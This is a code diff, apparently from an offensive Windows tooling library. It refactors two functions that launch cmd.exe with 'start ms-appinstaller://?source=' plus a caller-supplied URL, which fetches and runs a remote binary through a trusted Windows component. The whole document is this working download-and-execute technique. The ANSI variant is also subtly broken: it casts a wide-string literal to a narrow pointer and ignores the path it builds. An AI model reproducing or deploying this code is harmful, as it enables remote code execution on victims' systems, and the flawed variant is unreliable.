@@ -6,23 +6,20 @@ BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In
 	//		NOTE: Will display an error stating MS-APPINSTALLER PROTOCOL IS DISABLED
 	//		it must be enabled...
 
-	SHELLEXECUTEINFOW Info = { 0 };
 	PWCHAR Payload = NULL;
-	WCHAR CmdPath[28] = L"C:\\Windows\\System32\\cmd.exe";
 	DWORD dwPayloadLength = ERROR_SUCCESS;
 	BOOL bFlag = FALSE;
-	
-	Info.cbSize = sizeof(SHELLEXECUTEINFOW);
-	Info.lpVerb = L"open";
-	Info.nShow = SW_SHOW;
-	Info.lpFile = CmdPath;
+	WCHAR CmdPath[MAX_PATH * sizeof(WCHAR)] = { 0 };
 
 	dwPayloadLength = 36;
 	dwPayloadLength += RemoteUrlLengthInBytes;
 
+	if (!CreateWindowsObjectPathW(CmdPath, (PWCHAR)L"\\System32\\cmd.exe", MAX_PATH * sizeof(WCHAR), TRUE))
+		goto EXIT_ROUTINE;
+
 	Payload = (PWCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, dwPayloadLength);
 	if (Payload == NULL)
-		return FALSE;
+		goto EXIT_ROUTINE;
 
 	if (StringCopyW(Payload, (PWCHAR)L"/c start ms-appinstaller://?source=") == NULL)
 		goto EXIT_ROUTINE;
@@ -30,9 +27,7 @@ BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In
 	if (StringConcatW(Payload, RemoteUrlTextFile) == NULL)
 		goto EXIT_ROUTINE;
 
-	Info.lpParameters = Payload;
-
-	bFlag = ShellExecuteExW(&Info);
+	bFlag = FastcallExecuteBinaryShellExecuteExW(CmdPath, Payload);
 	
 EXIT_ROUTINE:
 
@@ -48,23 +43,20 @@ BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_
 	//		NOTE: Will display an error stating MS-APPINSTALLER PROTOCOL IS DISABLED
 	//		it must be enabled...
 
-	SHELLEXECUTEINFOA Info = { 0 };
 	PCHAR Payload = NULL;
-	CHAR CmdPath[28] = "C:\\Windows\\System32\\cmd.exe";
 	DWORD dwPayloadLength = ERROR_SUCCESS;
 	BOOL bFlag = FALSE;
-
-	Info.cbSize = sizeof(SHELLEXECUTEINFOA);
-	Info.lpVerb = "open";
-	Info.nShow = SW_SHOW;
-	Info.lpFile = CmdPath;
+	CHAR CmdPath[MAX_PATH] = { 0 };
 
 	dwPayloadLength = 36;
 	dwPayloadLength += RemoteUrlLengthInBytes;
 
+	if (!CreateWindowsObjectPathA(CmdPath, (PCHAR)L"\\System32\\cmd.exe", MAX_PATH, TRUE))
+		goto EXIT_ROUTINE;
+
 	Payload = (PCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, dwPayloadLength);
 	if (Payload == NULL)
-		return FALSE;
+		goto EXIT_ROUTINE;
 
 	if (StringCopyA(Payload, (PCHAR)"/c start ms-appinstaller://?source=") == NULL)
 		goto EXIT_ROUTINE;
@@ -72,9 +64,7 @@ BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_
 	if (StringConcatA(Payload, RemoteUrlTextFile) == NULL)
 		goto EXIT_ROUTINE;
 
-	Info.lpParameters = Payload;
-
-	bFlag = ShellExecuteExA(&Info);
+	bFlag = FastcallExecuteBinaryShellExecuteExA((PCHAR)"C:\\Windows\\System32\\cmd.exe", Payload);
 
 EXIT_ROUTINE:
 
